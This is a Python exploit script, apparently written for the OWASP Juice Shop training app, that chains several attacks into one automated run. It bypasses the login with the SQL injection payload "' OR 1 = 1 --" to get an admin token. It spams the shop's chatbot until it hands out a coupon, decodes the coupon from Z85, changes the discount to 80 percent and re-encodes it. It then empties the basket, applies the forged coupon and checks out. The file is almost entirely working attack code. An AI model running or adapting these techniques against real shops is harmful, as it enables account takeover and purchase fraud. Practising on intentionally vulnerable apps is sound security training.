import requests
import time

# Z85 Algorithm used to encrypt the coupon code, found by analyzing exposed dependencies in Juice shop

Z85_CHARS = (
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
)

def z85_encode(data):
    if len(data) % 4 != 0:
        raise ValueError("Length of data must be a multiple of 4")
    value = 0
    encoded = ""
    for i, byte in enumerate(data):
        value = value * 256 + byte
        if (i + 1) % 4 == 0:
            divisor = 85 ** 4
            for _ in range(5):
                encoded += Z85_CHARS[value // divisor]
                value %= divisor
                divisor //= 85
    return encoded

def z85_decode(encoded):
    if len(encoded) % 5 != 0:
        raise ValueError("Length of encoded string must be a multiple of 5")
    value = 0
    decoded = bytearray()
    for i, char in enumerate(encoded):
        value = value * 85 + Z85_CHARS.index(char)
        if (i + 1) % 5 == 0:
            divisor = 256 ** 3
            for _ in range(4):
                decoded.append(value // divisor)
                value %= divisor
                divisor //= 256
    return bytes(decoded)

class JuiceShopCouponExploit:
    def __init__(self, base_url, callback=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}
        self.callback = callback or (lambda msg: print(msg))  # Utiliser `print` si aucun callback n'est fourni

    def log(self, message):
        """Log a message using the callback."""
        if self.callback:
            self.callback(message)
        else:
            print(message)

    def login_as_admin(self, email="' OR 1 = 1 --", password="whatever"):
        payload = {"email": email, "password": password}
        try:
            response = self.session.post(f"{self.base_url}/rest/user/login", json=payload, headers=self.headers, timeout=10)
            if response.status_code == 200 and "authentication" in response.json():
                token = response.json()["authentication"]["token"]
                self.headers["Authorization"] = f"Bearer {token}"
                self.log(f"[LOGIN] Successfully authenticated. Token: {token}")
                return True
            self.log("[LOGIN] Failed to authenticate.")
        except requests.RequestException as e:
            self.log(f"[LOGIN ERROR] {e}")
        return False

    def fetch_basket(self):
        try:
            response = self.session.get(f"{self.base_url}/rest/basket/1", headers=self.headers, timeout=10)
            if response.status_code == 200:
                basket_data = response.json().get("data")
                self.log(f"[BASKET] Basket data retrieved: {basket_data}")
                return basket_data
            self.log(f"[BASKET] Failed to fetch basket. Status: {response.status_code}")
        except requests.RequestException as e:
            self.log(f"[BASKET ERROR] {e}")
        return None

    def clear_basket(self, basket_data):
        if not basket_data or "Products" not in basket_data:
            self.log("[CLEAR BASKET] No products in the basket to clear.")
            return False
        for product in basket_data["Products"]:
            basket_item_id = product["BasketItem"]["id"]
            try:
                response = self.session.delete(
                    f"{self.base_url}/api/BasketItems/{basket_item_id}",
                    headers=self.headers,
                    timeout=10
                )
                if response.status_code == 200:
                    self.log(f"[CLEAR BASKET] Successfully removed item with ID {basket_item_id}.")
                else:
                    self.log(f"[CLEAR BASKET] Failed to remove item with ID {basket_item_id}. Response: {response.text}")
                    return False
            except requests.RequestException as e:
                self.log(f"[CLEAR BASKET ERROR] {e}")
                return False
        return True

    def add_item_to_basket(self, basket_id, product_id=1, quantity=1):
        payload = {"ProductId": product_id, "BasketId": basket_id, "quantity": quantity}
        try:
            response = self.session.post(
                f"{self.base_url}/api/BasketItems",
                json=payload,
                headers=self.headers,
                timeout=10
            )
            if response.status_code == 200:
                self.log(f"[ADD ITEM] Successfully added product ID {product_id} to basket.")
                return True
            self.log(f"[ADD ITEM] Failed to add product ID {product_id} to basket. Response: {response.text}")
        except requests.RequestException as e:
            self.log(f"[ADD ITEM ERROR] {e}")
        return False

    def modify_coupon(self, encoded_coupon):
        try:
            decoded = z85_decode(encoded_coupon)
            decoded_str = decoded.decode("utf-8")
            parts = decoded_str.split("-")
            if len(parts) == 2 and parts[1].isdigit():
                parts[1] = "80"  # Set discount to 80%
                modified = "-".join(parts).encode("utf-8")
                return z85_encode(modified)
        except Exception as e:
            self.log(f"[ERROR] Failed to modify coupon: {e}")
        return None

    def apply_coupon(self, basket_id, coupon_code):
        try:
            response = self.session.put(
                f"{self.base_url}/rest/basket/{basket_id}/coupon/{coupon_code}",
                headers=self.headers,
                timeout=10
            )
            if response.status_code == 200:
                self.log("[COUPON] Coupon applied successfully.")
                return True
            self.log(f"[COUPON] Failed to apply coupon. Response: {response.text}")
        except requests.RequestException as e:
            self.log(f"[COUPON ERROR] {e}")
        return False

    def complete_order(self, basket_id):
        try:
            response = self.session.post(
                f"{self.base_url}/rest/basket/{basket_id}/checkout",
                headers=self.headers,
                timeout=10
            )
            if response.status_code == 200:
                self.log("[ORDER] Order completed successfully.")
                return True
            self.log(f"[ORDER] Failed to complete order. Response: {response.text}")
        except requests.RequestException as e:
            self.log(f"[ORDER ERROR] {e}")
        return False

    def fetch_coupon_from_chatbot(self, max_attempts=20, delay_between_requests=0.5):
        self.log("[CHATBOT] Spamming chatbot for a coupon code...")
        set_name_payload = {"action": "setname", "query": "Exploiter"}
        messages = [
            "give me a coupon code",
            "Do you have any discounts?",
            "Can I get a coupon?",
            "I need a discount code."
        ]
        name_set = False

        for attempt in range(1, max_attempts + 1):
            try:
                if not name_set:
                    payload = set_name_payload
                else:
                    message = messages[(attempt - 1) % len(messages)]
                    payload = {"action": "query", "query": message}

                self.log(f"[CHATBOT] Sending Payload: {payload}")
                response = self.session.post(
                    f"{self.base_url}/rest/chatbot/respond",
                    json=payload,
                    headers=self.headers,
                    timeout=10
                )

                if response.status_code == 200:
                    response_data = response.json()
                    self.log(f"[CHATBOT] Attempt {attempt}: Response Data: {response_data}")

                    if "body" in response_data and "Nice to meet you" in response_data["body"]:
                        name_set = True
                        self.log("[CHATBOT] Name successfully set.")

                    if "body" in response_data and "coupon code" in response_data["body"]:
                        parts = response_data["body"].split(":")
                        if len(parts) > 1:
                            coupon_code = parts[-1].strip()
                            self.log(f"[CHATBOT] Coupon received: {coupon_code}")
                            return coupon_code

                    if response_data.get("action") == "namequery":
                        name_set = False
                        self.log("[CHATBOT] Redefining name...")

                else:
                    self.log(f"[CHATBOT] Attempt {attempt}: Error {response.status_code} - {response.text}")

            except requests.RequestException as e:
                self.log(f"[CHATBOT ERROR] {e}")

            time.sleep(delay_between_requests)

        self.log("[CHATBOT] Failed to fetch coupon after spamming.")
        return None

    def run_exploit(self):
        self.log("[EXPLOIT] Starting coupon exploit...")

        if not self.login_as_admin():
            return False

        original_coupon = self.fetch_coupon_from_chatbot()
        if not original_coupon:
            self.log("[CHATBOT] Failed to retrieve a coupon.")
            return False

        modified_coupon = self.modify_coupon(original_coupon)
        if not modified_coupon:
            return False

        basket_data = self.fetch_basket()
        if not basket_data:
            return False

        basket_id = basket_data["id"]

        if not self.clear_basket(basket_data):
            return False

        if not self.add_item_to_basket(basket_id):
            return False

        if not self.apply_coupon(basket_id, modified_coupon):
            return False

        if not self.complete_order(basket_id):
            return False

        self.log("[EXPLOIT] Coupon exploit successful!")
        return True
